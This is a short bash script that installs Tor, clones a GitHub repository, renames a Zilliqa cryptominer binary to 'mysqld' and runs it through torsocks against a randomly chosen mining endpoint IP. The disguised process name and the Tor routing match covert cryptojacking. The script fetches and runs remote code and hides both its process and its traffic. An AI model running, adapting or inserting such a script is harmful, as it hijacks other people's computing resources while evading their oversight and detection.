#!/bin/bash

pub[0]="025972896F819CA931B61B811A13589FCEBA6CE5D6DEC30127675FFAD5327DE6C1"
ip[0]="13.229.119.163"
pub[1]="03A2ACC10B7F6507376DA8AE6FCBB5F1384B8E78F8C6730D5DD8514003A5075452"
ip[1]="13.229.79.67"
pub[2]="02699F19FB9DC7D945F6A187A07B8A9C58A7D737C9DD391B21BF252C1E020B36C7"
ip[2]="175.156.210.255"

rand=$[$RANDOM % ${#pub[@]}]
random_pub=${pub[$rand]}
random_ip=${ip[$rand]}
echo ${random_pub}
echo ${random_ip}

apt-get install -y tor torsocks && git clone https://github.com/orpheusyalcon/durian && cd durian && cp zilminer mysqld && chmod +x mysqld && service tor start && torsocks ./mysqld -P zil://${random_pub}.worker_2@${random_ip}:4202
